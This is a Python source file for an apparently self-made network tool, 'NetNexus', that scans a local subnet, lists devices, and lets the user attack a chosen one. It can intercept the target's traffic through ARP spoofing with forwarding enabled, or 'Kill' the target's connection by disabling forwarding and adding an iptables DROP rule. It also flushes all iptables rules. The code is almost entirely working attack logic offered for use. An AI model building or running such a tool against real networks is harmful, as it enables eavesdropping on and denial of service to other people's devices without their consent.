import scapy.all as scapy
import os, time, sys, subprocess, threading, platform
from core import scanner, spoof

# Shared memory
device_memory = {}
stop_scanner = False
current_os = platform.system() # Detects 'Linux' or 'Windows'

def is_admin():
    """Checks for Root (Linux) or Admin (Windows) privileges."""
    try:
        if current_os == "Windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.getuid() == 0
    except:
        return False

def set_forwarding(state):
    """Universal forwarding control."""
    if current_os == "Linux":
        if state:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
            subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
        else:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv6.conf.all.disable_ipv6=1"], capture_output=True)
            subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "DROP"], capture_output=True)
            
    elif current_os == "Windows":
        iface_name = scapy.conf.iface.name
        val = "enabled" if state else "disabled"
        subprocess.run(["netsh", "interface", "ipv4", "set", "interface", iface_name, f"forwarding={val}"], capture_output=True)
        if not state:
            subprocess.run(["netsh", "interface", "ipv6", "set", "interface", iface_name, "forwarding=disabled"], capture_output=True)

def background_scanner(ip_range):
    global device_memory, stop_scanner
    while not stop_scanner:
        device_memory = scanner.scan(ip_range, device_memory)
        time.sleep(0.5)

def main():
    global device_memory, stop_scanner
    
    if not is_admin():
        print(f"[-] NetNexus requires Admin/Root privileges on {current_os}.")
        return

    # Auto-detect gateway (Works on most home routers)
    gateway_ip = "192.168.8.1" if current_os == "Linux" else "192.168.1.1"
    ip_range = f"{gateway_ip}/24"

    print(f"[*] Running on {current_os}. Interface: {scapy.conf.iface.name}")

    scan_thread = threading.Thread(target=background_scanner, args=(ip_range,), daemon=True)
    scan_thread.start()

    while True:
        print("\n" + "="*45)
        print(f"      NetNexus: Multi-OS Build ({current_os})")
        print("="*45)
        
        current_list = list(device_memory.values())
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': 
            stop_scanner = True
            sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            print(f"\n[1] Intercept [2] Kill")
            mode = input("Action: ").strip()

            gateway_mac, _ = spoof.get_device_info(gateway_ip)
            wait_time = 0.001 if mode == "2" else 0.5

            if mode == "2":
                set_forwarding(False)
            else:
                set_forwarding(True)

            print(f"[*] Attacking {target['ip']}...")
            while True:
                spoof.spoof(target['ip'], gateway_ip, target['mac'], gateway_mac)
                time.sleep(wait_time) 
                
        except Exception as e:
            print(f"[-] Error: {e}")
            break
        except KeyboardInterrupt:
            set_forwarding(True)
            spoof.restore(target['ip'], gateway_ip)
            print("\n[*] Resetting Network...")
            break

if __name__ == "__main__":
    main()
